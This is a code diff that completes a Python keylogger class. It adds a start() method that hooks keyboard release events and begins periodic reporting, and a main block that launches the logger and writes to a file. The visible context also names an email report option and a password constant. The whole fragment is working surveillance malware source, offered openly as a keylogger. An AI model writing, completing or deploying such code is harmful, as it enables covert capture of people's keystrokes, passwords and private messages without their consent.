@@ -10,6 +10,7 @@ LOG_ADDRESS_PASSWD = "passwd"
 
 
 class Keylogger:
+
     def __init__(self, interval, report_method="email"):
         self.interval = interval
         self.report_method = report_method
@@ -18,7 +19,11 @@ class Keylogger:
         self.end_dt = datetime.now()
 
 
-    
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)  # start the keylogger
+        self.report()   # initiate report process
+        keyboard.wait() # block current thread
 
 
     def callback(self, event):
@@ -70,9 +75,9 @@ class Keylogger:
 
 
 
-
-
-
+if __name__ == "__main__":  # if this program is run directly and not imported
+    keylogger = Keylogger(interval=REPORT_TIMER, report_method="file")
+    keylogger.start()
 
 
 
